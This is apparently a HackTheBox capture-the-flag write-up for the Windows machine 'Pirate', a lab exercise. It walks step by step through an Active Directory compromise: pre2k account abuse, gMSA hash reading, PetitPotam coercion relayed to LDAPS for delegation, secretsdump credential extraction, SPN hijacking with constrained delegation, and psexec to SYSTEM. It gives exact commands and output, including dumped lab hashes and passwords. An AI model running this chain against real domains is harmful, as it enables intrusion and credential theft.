---
title: Pirate
os: Windows
difficulty: Hard
tags:
  - Active Directory
  - Pre2k
  - gMSA
  - PetitPotam
  - RBCD
  - Constrained Delegation
  - SPN Hijacking
  - Privilege Escalation
date: 2026-03-01
---

# 🛡️ HTB - Pirate (Hard)

<p align="center">
  <img src="https://img.shields.io/badge/Platform-HackTheBox-green?style=for-the-badge&logo=hackthebox" alt="HackTheBox" />
  <img src="https://img.shields.io/badge/OS-Windows-blue?style=for-the-badge&logo=windows" alt="OS Windows" />
  <img src="https://img.shields.io/badge/Difficulty-Hard-red?style=for-the-badge" alt="Hard Difficulty" />
</p>

---

### 💻 Target Information
- **Machine Name:** Pirate
- **Operating System:** Windows Server 2019
- **Difficulty:** Hard
- **Date of Scan:** 2026-03-01
- **Vulnerabilities:** Pre-Windows 2000 Compatibility Group Abuse, gMSA Password Read Delegation, PetitPotam Coercion to LDAPS, Constrained Delegation with Protocol Transition & SPN Hijacking

---

## Step 1 - Reconnaissance

We start by running an Nmap scan to enumerate open ports and running services on the target host:

```bash
nmap -A -sS -P -T4 --min-rate 5000 10.129.6.225
```

```text
Starting Nmap 7.94SVN ( https://nmap.org ) at 2026-03-01 14:24 UTC
Nmap scan report for 10.129.6.225
Host is up (0.25s latency).
Not shown: 986 filtered tcp ports (no-response)
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
80/tcp   open  http          Microsoft IIS httpd 10.0
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
|_http-title: IIS Windows Server
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-03-01 21:23:36Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: pirate.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2026-03-01T21:25:38+00:00; +6h58m43s from scanner time.
| ssl-cert: Subject: commonName=DC01.pirate.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.pirate.htb
| Not valid before: 2025-06-09T14:05:15
|_Not valid after:  2026-06-09T14:05:15
443/tcp  open  https?
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: pirate.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2026-03-01T21:25:37+00:00; +6h58m43s from scanner time.
| ssl-cert: Subject: commonName=DC01.pirate.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.pirate.htb
| Not valid before: 2025-06-09T14:05:15
|_Not valid after:  2026-06-09T14:05:15
2179/tcp open  vmrdp?
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: pirate.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC01.pirate.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.pirate.htb
| Not valid before: 2025-06-09T14:05:15
|_Not valid after:  2026-06-09T14:05:15
|_ssl-date: 2026-03-01T21:25:38+00:00; +6h58m43s from scanner time.
3269/tcp open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: pirate.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2026-03-01T21:25:37+00:00; +6h58m42s from scanner time.
| ssl-cert: Subject: commonName=DC01.pirate.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.pirate.htb
| Not valid before: 2025-06-09T14:05:15
|_Not valid after:  2026-06-09T14:05:15
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running (JUST GUESSING): Microsoft Windows 2019 (89%)
Aggressive OS guesses: Microsoft Windows Server 2019 (89%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
|_clock-skew: mean: 6h58m42s, deviation: 0s, median: 6h58m42s
| smb2-time: 
|   date: 2026-03-01T21:25:01
|_  start_date: N/A

TRACEROUTE (using port 139/tcp)
HOP RTT       ADDRESS
1   244.09 ms 10.10.14.1
2   237.25 ms 10.129.6.225

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 145.36 seconds
```

- 🔍 *A Windows Active Directory machine. There is an IIS web server on port 80, but it only hosts the default IIS page.*
- 🔍 *We have also obtained initial domain credentials: `pentest / p3nt3st2025!&`.*

---

## Step 2 - Initial Foothold

- 🔍 *Let's first test if the credentials are valid using NetExec (nxc) over SMB:*

```bash
nxc smb 10.129.6.225 -u 'pentest' -p 'p3nt3st2025!&'
```

```text
SMB         10.129.6.225    445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:pirate.htb) (signing:True) (SMBv1:False)
SMB         10.129.6.225    445    DC01             [+] pirate.htb\pentest:p3nt3st2025!&
```

- 🔍 *The credentials are valid. (Note: Shares enumeration timed out due to NetBIOS delay).*
- 🔍 *Let's enumerate Active Directory users:*

```bash
nxc smb 10.129.7.251 -u 'pentest' -p 'p3nt3st2025!&' --users
```

```text
SMB         10.129.7.251    445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:pirate.htb) (signing:True) (SMBv1:False)
SMB         10.129.7.251    445    DC01             [+] pirate.htb\pentest:p3nt3st2025!&
SMB         10.129.7.251    445    DC01             -Username-                    -Last PW Set-       -BadPW- -Description-                                                
SMB         10.129.7.251    445    DC01             Administrator                 2025-06-08 14:32:36 0       Built-in account for administering the computer/domain       
SMB         10.129.7.251    445    DC01             Guest                         <never>             0       Built-in account for guest access to the computer/domain     
SMB         10.129.7.251    445    DC01             krbtgt                        2025-06-08 14:40:29 0       Key Distribution Center Service Account                      
SMB         10.129.7.251    445    DC01             a.white_adm                   2026-01-16 00:36:34 0           
SMB         10.129.7.251    445    DC01             a.white                       2025-06-08 19:33:01 0           
SMB         10.129.7.251    445    DC01             pentest                       2025-06-09 13:40:23 0           
SMB         10.129.7.251    445    DC01             j.sparrow                     2025-06-09 15:08:44 0           
SMB         10.129.7.251    445    DC01             [*] Enumerated 7 local users: PIRATE
```

- 🔍 *We check BloodHound and notice that the `Pre-Windows 2000 Compatible Access` group contains the pre-created computer accounts `EXCH01$` and `MS01$`. Since `Domain Users` belongs to this group, we can query TGT tickets for these machine accounts:*

```bash
nxc ldap pirate.htb -u 'pentest' -p 'p3nt3st2025!&' -M pre2k
```

```text
/home/kali/Tools/NetExec/venv/lib/python3.12/site-packages/masky/lib/smb.py:6: UserWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html.
  from pkg_resources import resource_filename
LDAP        10.129.11.99    389    DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:pirate.htb) (signing:None) (channel binding:Never)
LDAP        10.129.11.99    389    DC01             [+] pirate.htb\pentest:p3nt3st2025!& 
PRE2K       10.129.11.99    389    DC01             Pre-created computer account: MS01$
PRE2K       10.129.11.99    389    DC01             Pre-created computer account: EXCH01$
PRE2K       10.129.11.99    389    DC01             [+] Found 2 pre-created computer accounts. Saved to /root/.nxc/modules/pre2k/pirate.htb/precreated_computers.txt
PRE2K       10.129.11.99    389    DC01             [+] Successfully obtained TGT for ms01@pirate.htb
PRE2K       10.129.11.99    389    DC01             [+] Successfully obtained TGT for exch01@pirate.htb
PRE2K       10.129.11.99    389    DC01             [+] Successfully obtained TGT for 2 pre-created computer accounts. Saved to /root/.nxc/modules/pre2k/ccache  
```

- 🔍 *(Note: Ensure your machine's system time is synchronized with the target domain controller before attempting Kerberos actions).*
- 🔍 *Analyzing privileges for `MS01$` in BloodHound shows a path to read gMSA credentials:*
  `MS01$` ──[MemberOf]──> `Domain Secure Servers` ──[ReadGMSA]──> `gMSA_ADFS_prod$` ──[MemberOf]──> `Remote Management Users`
- 🔍 *We extract the gMSA passwords using our computer account ticket:*

```bash
nxc ldap pirate.htb -u 'MS01$' -p 'ms01' --gmsa -k
```

```text
LDAP        pirate.htb      389    DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:pirate.htb) (signing:None) (channel binding:Never)                                                                                                                                                         
LDAP        pirate.htb      389    DC01             [+] pirate.htb\MS01$:ms01 
LDAP        pirate.htb      389    DC01             [*] Getting GMSA Passwords
LDAP        pirate.htb      389    DC01             Account: gMSA_ADCS_prod$      NTLM: 304106f739822ea2ad8ebe23f802d078     PrincipalsAllowedToReadPassword: Domain Secure Servers                                                                                                                                         
LDAP        pirate.htb      389    DC01             Account: gMSA_ADFS_prod$      NTLM: 8126756fb2e69697bfcb04816e685839     PrincipalsAllowedToReadPassword: Domain Secure Servers 
```

- 🔍 *We obtain the NT hash for `gMSA_ADFS_prod$`. We use it to launch an Evil-WinRM shell:*

```bash
evil-winrm -i pirate.htb -u 'gMSA_ADFS_prod$' -H 8126756fb2e69697bfcb04816e685839
```

```text
Evil-WinRM shell v3.7
Warning: Remote path completions is disabled due to ruby limitation
Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\gMSA_ADFS_prod$\Documents>
```

- 🔍 *We have initial access. We verify network interfaces and discover an internal Switch interface:*

```powershell
ipconfig
```

```text
Windows IP Configuration

Ethernet adapter vEthernet (Switch01):
   Connection-specific DNS Suffix  . :
   Link-local IPv6 Address . . . . . : fe80::d976:c606:587e:f1e1%8
   IPv4 Address. . . . . . . . . . . : 192.168.100.1
   Subnet Mask . . . . . . . . . . . : 255.255.255.0
   Default Gateway . . . . . . . . . :

Ethernet adapter Ethernet0 2:
   Connection-specific DNS Suffix  . : .htb
   IPv4 Address. . . . . . . . . . . : 10.129.11.99
   Subnet Mask . . . . . . . . . . . : 255.255.0.0
   Default Gateway . . . . . . . . . : 10.129.0.1
```

- 🔍 *We execute `fscan.exe` to map the internal network segment:*

```powershell
.\fscan.exe -h 192.168.100.1/24 -nobr -nopoc
```

```text
(icmp) Target 192.168.100.1   is alive
(icmp) Target 192.168.100.2   is alive
[*] Icmp alive hosts len is: 2
192.168.100.1:88 open
192.168.100.2:808 open
192.168.100.2:445 open
192.168.100.1:445 open
192.168.100.2:443 open
192.168.100.2:139 open
192.168.100.1:139 open
192.168.100.2:135 open
192.168.100.2:80 open
192.168.100.1:135 open
[*] alive ports len is: 10
start vulscan
[*] NetInfo
[*]192.168.100.1
   [->]DC01
   [->]192.168.100.1
   [->]10.129.1.12
[*] NetInfo
[*]192.168.100.2
   [->]WEB01
   [->]192.168.100.2
[*] WebTitle http://192.168.100.2      code:200 len:703    title:IIS Windows Server
```

- 🔍 *We find an internal web server at `192.168.100.2` (`WEB01`). We establish a local port forwarding tunnel to test for coercion opportunities:*

```bash
proxychains nxc smb WEB01.pirate.htb -u 'gMSA_ADFS_prod$' -H 'fd9ea7ac7820dba5155bd6ed2d850c09' -M coerce_plus
```

```text
[proxychains] config file found: /etc/proxychains4.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
/home/kali/Tools/NetExec/venv/lib/python3.12/site-packages/masky/lib/smb.py:6: UserWarning: pkg_resources is deprecated as an API.
  from pkg_resources import resource_filename
[proxychains] Strict chain  ...  127.0.0.1:1081  ...  WEB01.pirate.htb:445  ...  OK
SMB         224.0.0.1       445    WEB01            [*] Windows 10 / Server 2019 Build 17763 x64 (name:WEB01) (domain:pirate.htb) (signing:False) (SMBv1:False)
SMB         224.0.0.1       445    WEB01            [+] pirate.htb\gMSA_ADFS_prod$:fd9ea7ac7820dba5155bd6ed2d850c09
COERCE_PLUS 224.0.0.1       445    WEB01            VULNERABLE, PetitPotam                                                                                    
COERCE_PLUS 224.0.0.1       445    WEB01            VULNERABLE, PrinterBug                                                                                    
COERCE_PLUS 224.0.0.1       445    WEB01            VULNERABLE, MSEven
```

- 🔍 *The host `WEB01` is vulnerable to PetitPotam coercion.*

> [!NOTE]
> **PetitPotam Coercion (CVE-2021-36942):**
> Abuses the MS-EFSRPC (Encrypting File System Remote Protocol) interface (`EfsRpcOpenFileRaw`) to force a remote Windows system to authenticate back to an arbitrary server via NTLM. We can capture this authentication and relay it to LDAPS on the DC to configure Resource-Based Constrained Delegation (RBCD) over the coerced computer account.

- 🔍 *We start `ntlmrelayx.py` on our host, targeting LDAPS on the DC (`192.168.100.1`):*

```bash
proxychains ntlmrelayx.py -t ldaps://192.168.100.1 --remove-mic --delegate-access -smb2support
```

```text
[proxychains] config file found: /etc/proxychains4.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
Impacket v0.14.0.dev0+20251114.155318.8925c2ce - Copyright Fortra, LLC and its affiliated companies 

[*] Protocol Client SMB loaded..
[*] Protocol Client LDAP loaded..
[*] Protocol Client LDAPS loaded..
[*] Protocol Client WINRMS loaded..
[*] Protocol Client RPC loaded..
[*] Running in relay mode to single host
[*] Setting up SMB Server on port 445
[*] Setting up HTTP Server on port 80
[*] Setting up RAW Server on port 6666
[*] Servers started, waiting for connections
```

> [!IMPORTANT]
> **LDAPS Relaying Signing Requirements (CVE-2019-1040):**
> Standard client SMB authentication enforces message signing flags (`Negotiate Sign`, `Negotiate Always Sign`, `Negotiate Key Exchange`).
> When relaying to LDAPS, the server fails the connection because the attacker cannot sign the traffic.
> The `--remove-mic` flag exploits CVE-2019-1040 to strip the Message Integrity Code (MIC) and turn off the signing flags, enabling successful relaying.

- 🔍 *We trigger the PetitPotam coercion using `coercer`:*

```bash
proxychains coercer coerce \
    -u 'gMSA_ADFS_prod$' \
    --hashes :fd9ea7ac7820dba5155bd6ed2d850c09 \
    -d pirate.htb \
    -l 10.10.14.67 \
    -t 192.168.100.2 \
    --delay 1
```

```text
[proxychains] config file found: /etc/proxychains4.conf
       ______
      / ____/___  ___  _____________  _____
     / /   / __ \/ _ \/ ___/ ___/ _ \/ ___/
    / /___/ /_/ /  __/ /  / /__/  __/ /      v2.4.3
    \____/\____/\___/_/   \___/\___/_/       by Remi GASCOU (Podalirius)

[info] Starting coerce mode
[info] Scanning target 192.168.100.2
[proxychains] Strict chain  ...  127.0.0.1:1081  ...  192.168.100.2:445  ...  OK
[+] SMB named pipe '\PIPE\lsarpc' is accessible!
   [+] Successful bind to interface (c681d488-d850-11d0-8c52-00c04fd90f7e, 1.0)!
      [>] (-testing-) MS-EFSR──>EfsRpcAddUsersToFile(FileName='\\10.10.14.67\g7x2qWxU\file.txt\x00')
```

- 🔍 *The incoming connection is captured, relayed to LDAPS, and RBCD write access is modified:*

```text
[*] (SMB): Received connection from 10.129.2.3, attacking target ldaps://192.168.100.1
[proxychains] Strict chain  ...  127.0.0.1:1081  ...  192.168.100.1:636  ...  OK
[*] (SMB): Authenticating connection from PIRATE/WEB01$@10.129.2.3 against ldaps://192.168.100.1 SUCCEED [1]
[*] ldaps://PIRATE/WEB01$@192.168.100.1 [1] -> Attempting to create computer in: CN=Computers,DC=pirate,DC=htb
[*] ldaps://PIRATE/WEB01$@192.168.100.1 [1] -> Adding new computer with username: PPXJROQK$ and password: oQJ#6k7FbeM7St+ result: OK
[*] ldaps://PIRATE/WEB01$@192.168.100.1 [1] -> Delegation rights modified succesfully!
[*] ldaps://PIRATE/WEB01$@192.168.100.1 [1] -> PPXJROQK$ can now impersonate users on WEB01$ via S4U2Proxy
```

- 🔍 *We request a service ticket (S4U) impersonating `Administrator` on `WEB01` using `impacket-getST`:*

```bash
proxychains impacket-getST -spn cifs/WEB01.pirate.htb \
    -impersonate Administrator \
    -dc-ip 192.168.100.1 \
    pirate.htb/PPXJROQK$:'oQJ#6k7FbeM7St+'
```

```text
[proxychains] config file found: /etc/proxychains4.conf
Impacket v0.14.0.dev0+20251114.155318.8925c2ce - Copyright Fortra, LLC and its affiliated companies 

[-] CCache file is not found. Skipping...
[*] Getting TGT for user
[*] Impersonating Administrator
[*] Requesting S4U2self
[*] Requesting S4U2Proxy
[*] Saving ticket in Administrator@cifs_WEB01.pirate.htb@PIRATE.HTB.ccache
```

- 🔍 *We load the ticket and dump the local SAM hashes and LSA secrets from `WEB01`:*

```bash
export KRB5CCNAME=Administrator@cifs_WEB01.pirate.htb@PIRATE.HTB.ccache
proxychains impacket-secretsdump -k -no-pass -dc-ip 192.168.100.1 pirate.htb/Administrator@WEB01.pirate.htb
```

```text
Impacket v0.14.0.dev0+20251114.155318.8925c2ce - Copyright Fortra, LLC and its affiliated companies 

[*] Service RemoteRegistry is in stopped state
[*] Starting service RemoteRegistry
[*] Target system bootKey: 0x342dfe90cc4061078b79f011cd08f931
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:b1aac1584c2ea8ed0a9429684e4fc3e5:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:60da2d3ba00d6b5932e4c87dce6fa6b4:::
[*] Dumping cached domain logon information (domain/username:hash)
PIRATE.HTB/Administrator:$DCC2$10240#Administrator#8baf09ddc5830ac4456ee8639dd89644: (2026-02-25 02:41:09+00:00)
PIRATE.HTB/gMSA_ADFS_prod$:$DCC2$10240#gMSA_ADFS_prod$#66812dfee46ff41c9c8245a2819c3183: (2026-03-07 21:12:24+00:00)
PIRATE.HTB/a.white:$DCC2$10240#a.white#366c8924be3ea6d1d12825569a4bcc39: (2026-03-07 21:10:20+00:00)
[*] Dumping LSA Secrets
[*] DefaultPassword 
PIRATE\a.white:E2nvAOKSz5Xz2MJu
```

- 🔍 *We extract plaintext credentials for the `a.white` user:*
  `a.white:E2nvAOKSz5Xz2MJu`
- 🔍 *We establish an administrative Evil-WinRM shell on `WEB01`:*

```bash
proxychains evil-winrm -i WEB01.pirate.htb -u 'administrator' -H b1aac1584c2ea8ed0a9429684e4fc3e5
```

```text
Evil-WinRM shell v3.7
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Administrator\Documents>
```

- 🔍 *We retrieve the user flag from `a.white`'s desktop:*

```powershell
Get-Content -Path "C:\Users\a.white\Desktop\user.txt"
```

```text
366c8924************************
```

---

## Step 3 - Privilege Escalation

- 🔍 *Analyzing BloodHound relationships for `a.white` shows a path to the Domain Controller:*
  `a.white` ──[ForcePasswordChange]──> `a.white_adm` ──[MemberOf]──> `IT@Pirate.htb` ──[WriteSPN]──> `DC01.Pirate.htb`
- 🔍 *We abuse the `ForcePasswordChange` permission to reset the password of `a.white_adm` using `bloodyAD`:*

```bash
bloodyAD --host DC01.pirate.htb -d pirate.htb -u a.white -p E2nvAOKSz5Xz2MJu set password 'a.white_adm' 'FluXionP@ssw0rd'
```

```text
[+] Password changed successfully!
```

- 🔍 *We check for existing delegation attributes configured on `a.white_adm`:*

```bash
nxc ldap dc01.pirate.htb -u 'a.white_adm' -p 'FluXionP@ssw0rd' --find-delegation
```

```text
LDAP        10.129.244.95   389    DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:pirate.htb) (signing:None) (channel binding:Never)                                         
LDAP        10.129.244.95   389    DC01             [+] pirate.htb\a.white_adm:FluXionP@ssw0rd
LDAP        10.129.244.95   389    DC01             AccountName AccountType DelegationType                     DelegationRightsTo       
LDAP        10.129.244.95   389    DC01             ----------- ----------- ---------------------------------- ---------------------------------------                                                      
LDAP        10.129.244.95   389    DC01             a.white_adm Person      Constrained w/ Protocol Transition http/WEB01.pirate.htb, HTTP/WEB01  
```

- 🔍 *Constrained delegation with Protocol Transition is enabled for `a.white_adm` over the `HTTP/WEB01.pirate.htb` service.*

> [!IMPORTANT]
> **Kerberos Constrained Delegation with Protocol Transition:**
> Permits the service account (`a.white_adm`) to request a service ticket (TGS) on behalf of any domain user (such as `Administrator`) to access configured SPN services (`HTTP/WEB01`), even if the user originally authenticated via a non-Kerberos protocol (like NTLM).

> [!NOTE]
> **SPN Hijacking + KCD Exploitation Path:**
> Since `a.white_adm` has `WriteSPN` rights over the Domain Controller `DC01`, we can delete the `HTTP/WEB01.pirate.htb` SPN from the `WEB01` machine account and assign it to the Domain Controller `DC01`.
> 
> This tricks the KDC into generating a service ticket for the hijacked SPN that can be decrypted using the machine key of `DC01`, allowing us to authenticate as `Administrator` on the Domain Controller.

- 🔍 *We verify existing HTTP SPNs on `WEB01$` and `DC01$`:*

```bash
bloodyAD -H DC01.pirate.htb -d pirate.htb -u a.white_adm -p 'FluXionP@ssw0rd' get object 'WEB01$' --attr servicePrincipalName | grep HTTP
```

```text
servicePrincipalName: tapinego/WEB01; tapinego/WEB01.pirate.htb; WSMAN/WEB01; WSMAN/WEB01.pirate.htb; HOST/WEB01.pirate.htb; RestrictedKrbHost/WEB01.pirate.htb; HOST/WEB01; RestrictedKrbHost/WEB01; TERMSRV/WEB01.pirate.htb; TERMSRV/WEB01; HTTP/WEB01; HTTP/WEB01.pirate.htb
```

```bash
bloodyAD -H DC01.pirate.htb -d pirate.htb -u a.white_adm -p 'FluXionP@ssw0rd' get object 'DC01$' --attr servicePrincipalName | grep HTTP
```

- 🔍 *`HTTP/WEB01.pirate.htb` is currently assigned to `WEB01$`. We delete the SPN from `WEB01$`:*

```bash
bloodyAD -H DC01.pirate.htb -d pirate.htb -u a.white_adm -p 'FluXionP@ssw0rd' msldap delspn "CN=WEB01,CN=Computers,DC=pirate,DC=htb" "HTTP/WEB01.pirate.htb"
```

- 🔍 *We add the `HTTP/WEB01.pirate.htb` SPN to the Domain Controller `DC01$`:*

```bash
bloodyAD -H DC01.pirate.htb -d pirate.htb -u a.white_adm -p 'FluXionP@ssw0rd' msldap addspn "CN=DC01,OU=Domain Controllers,DC=pirate,DC=htb" "HTTP/WEB01.pirate.htb"
```

- 🔍 *We verify the updated SPN listings:*

```bash
bloodyAD -H DC01.pirate.htb -d pirate.htb -u a.white_adm -p 'FluXionP@ssw0rd' get object 'WEB01$' --attr servicePrincipalName | grep HTTP
```

```text
servicePrincipalName: tapinego/WEB01; tapinego/WEB01.pirate.htb; WSMAN/WEB01; WSMAN/WEB01.pirate.htb; HOST/WEB01.pirate.htb; RestrictedKrbHost/WEB01.pirate.htb; HOST/WEB01; RestrictedKrbHost/WEB01; TERMSRV/WEB01.pirate.htb; TERMSRV/WEB01; HTTP/WEB01
```

```bash
bloodyAD -H DC01.pirate.htb -d pirate.htb -u a.white_adm -p 'FluXionP@ssw0rd' get object 'DC01$' --attr servicePrincipalName | grep HTTP
```

```text
servicePrincipalName: HTTP/WEB01.pirate.htb; Hyper-V Replica Service/DC01; Hyper-V Replica Service/DC01.pirate.htb; Microsoft Virtual System Migration Service/DC01; Microsoft Virtual System Migration Service/DC01.pirate.htb; Microsoft Virtual Console Service/DC01; Microsoft Virtual Console Service/DC01.pirate.htb; Dfsr-12F9A27C-BF97-4787-9364-D31B6C55EB04/DC01.pirate.htb; ldap/DC01.pirate.htb/ForestDnsZones.pirate.htb; ldap/DC01.pirate.htb/DomainDnsZones.pirate.htb; DNS/DC01.pirate.htb; GC/DC01.pirate.htb/pirate.htb; RestrictedKrbHost/DC01.pirate.htb; RestrictedKrbHost/DC01; RPC/21c2943d-6163-4df9-aff7-3d164aa2cfbb._msdcs.pirate.htb; HOST/DC01/PIRATE; HOST/DC01.pirate.htb/PIRATE; HOST/DC01; HOST/DC01.pirate.htb; HOST/DC01.pirate.htb/pirate.htb; E3514235-4B06-11D1-AB04-00C04FC2DCD2/21c2943d-6163-4df9-aff7-3d164aa2cfbb/pirate.htb; ldap/DC01/PIRATE; ldap/21c2943d-6163-4df9-aff7-3d164aa2cfbb._msdcs.pirate.htb; ldap/DC01.pirate.htb/PIRATE; ldap/DC01; ldap/DC01.pirate.htb; ldap/DC01.pirate.htb/pirate.htb
```

- 🔍 *The target SPN is now registered on the Domain Controller.*

> [!IMPORTANT]
> **S4U Delegation Flow:**
> - **S4U2Self:** Allows `a.white_adm` to request a Kerberos service ticket on behalf of the `Administrator` user.
> - **S4U2Proxy:** Allows `a.white_adm` to relay the ticket to the hijacked target service (`HTTP/WEB01.pirate.htb` now on `DC01`), which will be encrypted with `DC01$`'s key.

- 🔍 *We run `getST.py` to request a ticket for the `HTTP/WEB01.pirate.htb` service impersonating `Administrator`, translation it to `CIFS/DC01.pirate.htb`:*

```bash
getST.py PIRATE.HTB/a.white_adm:'FluXionP@ssw0rd' \
    -spn HTTP/WEB01.pirate.htb \
    -impersonate Administrator \
    -dc-ip DC01.pirate.htb \
    -altservice CIFS/DC01.pirate.htb
```

```text
[*] Querying offset from: pirate.htb
[*] Running: getST.py PIRATE.HTB/a.white_adm:FluXionP@ssw0rd -spn HTTP/WEB01.pirate.htb -impersonate Administrator -dc-ip DC01.pirate.htb -altservice CIFS/DC01.pirate.htb
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies

[-] CCache file is not found. Skipping...
[*] Getting TGT for user
[*] Impersonating Administrator
[*] Requesting S4U2self
[*] Requesting S4U2Proxy
[*] Changing service from HTTP/WEB01.pirate.htb@PIRATE.HTB to CIFS/DC01.pirate.htb@PIRATE.HTB
[*] Saving ticket in Administrator@CIFS_DC01.pirate.htb@PIRATE.HTB.ccache
```

- 🔍 *We load our newly acquired Administrator ticket:*

```bash
export KRB5CCNAME=Administrator@CIFS_DC01.pirate.htb@PIRATE.HTB.ccache
```

- 🔍 *We execute `psexec.py` to gain administrative access on `DC01`:*

```bash
psexec.py -k -no-pass DC01.pirate.htb
```

```text
[*] Requesting shares on DC01.pirate.htb.....
[*] Found writable share ADMIN$
[*] Uploading file LGblabiJ.exe
[*] Opening SVCManager on DC01.pirate.htb.....
[*] Creating service Xsus on DC01.pirate.htb.....
[*] Starting service Xsus.....
[!] Press help for extra shell commands

Microsoft Windows [Version 10.0.17763.8385]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32> whoami
nt authority\system
```

- 🔍 *We read the root flag from the Administrator's desktop:*

```cmd
type C:\users\administrator\desktop\root.txt
```

```text
e98bc671************************
```

- 🔍 *Full Domain Compromised.*
